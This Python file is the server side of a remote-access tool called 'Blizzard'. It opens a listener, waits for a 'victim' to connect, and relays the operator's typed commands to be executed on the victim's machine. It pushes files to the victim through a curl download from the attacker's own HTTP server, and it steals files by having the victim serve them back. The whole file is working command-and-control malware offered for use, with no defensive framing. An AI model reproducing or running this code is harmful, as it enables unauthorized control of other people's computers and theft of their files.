import socket, socketserver, http.server, requests
import random
import subprocess
import threading

# Function to start HTTP server
def http_server(PORT_HTTP):
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT_HTTP), handler) as httpd:
        print(f"HTTP server listening on port {PORT_HTTP}")
        httpd.serve_forever()

# Main function to handle the TCP server
def main():
    # Socket for the command-and-control server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    HOST = socket.gethostbyname(socket.gethostname())  # Change to the IP of your machine
    PORT = 13921
    PORT_HTTP = 8003
    random_port_http = 0
    # Bind and listen for incoming connections
    server.bind((HOST, PORT))
    server.listen(1)
    print("WELCOME TO THE BLIZZARD!!!")
    print("If you want to send the victim a file type the command: 'send_file example.txt' and make sure the file is in the directory you are running Blizzard from!")
    print("If you want to steal a file type the command: 'get_file example.txt' and make sure that you are in the directory you are stealing the file from!")
    print("")
    print("Waiting for victim to connect...")
    # Start the HTTP server in a separate thread
    t1 = threading.Thread(target=http_server, args=(PORT_HTTP,))
    t1.daemon = True  # Ensures the HTTP server thread will close when the main thread closes
    t1.start()
    print(f"Blizzard listening on port {PORT}")
    while True:
        client, address = server.accept()
        print(f"WE GOT ONE: {address[0]}")


        # Receive and send commands to the client
        try:
            while True:
                command = input("Command on victim: ")
                if command.lower() == "exit":
                    print("Closing connection.")
                    break
                if command.startswith("send_file"):
                    command = f"curl -O http://{HOST}:{PORT_HTTP}/{command.split()[1]}"                    
                if command.startswith("get_file"):
                    filename = command.split()[1]
                    random_port_http = random.randint(40000,49000)
                    command = f"get_file {random_port_http}"
                client.send(command.encode("utf-8"))
                response = client.recv(1024).decode("utf-8")
                if response == f"HTTP {random_port_http}" and command.startswith("get_file"):
                    print("hey")
                    get_file(address[0], random_port_http, filename)
                print(response)
        except Exception:
            print("The victim disconnected.")
        finally:
            client.close()


def get_file(address, port, filename):
    file_url = f"http://{address}:{port}/{filename}"
    print(file_url)
    connected = False
    while connected == False:
        try:
            response = requests.get(file_url)
            connected = True
        except Exception:
            print("loading")

    # Check if the request was successful
    if response.status_code == 200:
        # Open a file in binary write mode
        with open(filename, 'wb') as file:
            # Write the content of the response to the file
            file.write(response.content)
        print("File downloaded successfully!")
    else:
        print(f"Failed to download file. HTTP Status Code: {response.status_code}")

if __name__ == "__main__":
    main()
